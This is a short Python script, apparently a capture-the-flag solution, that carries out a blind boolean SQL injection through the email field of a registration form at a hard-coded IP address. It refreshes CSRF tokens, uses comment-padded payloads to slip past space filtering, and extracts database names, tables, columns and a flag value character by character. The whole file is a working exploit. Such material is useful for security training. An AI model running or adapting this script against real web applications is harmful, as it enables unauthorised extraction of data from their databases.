import requests
from bs4 import BeautifulSoup

url = "http://61.147.171.105:62385/register"

r = requests.get(url)
soup = BeautifulSoup(r.text,"html5lib")
token = soup.find_all(id='csrf_token')[0].get("value")

notice = "Please use a different email address."
result = ""

database = "(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"
tables = "(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"
columns = "(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"
data = "(SELECT/**/GROUP_CONCAT(flag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flag)"


for i in range(1,100):
    for j in range(32,127):
        payload = "test'/**/or/**/ascii(substr("+  data +",%d,1))=%d#/**/@chybeta.com" % (i,j)
        post_data = {
            'csrf_token': token,
            'username': 'a',
            'email':payload,
            'password':'a',
            'password2':'a',
            'submit':'Register'
        }
        r = requests.post(url,data=post_data)
        soup = BeautifulSoup(r.text,"html5lib")
        token = soup.find_all(id='csrf_token')[0].get("value")
        if notice in r.text:
            result += chr(j)
            print(result)
            break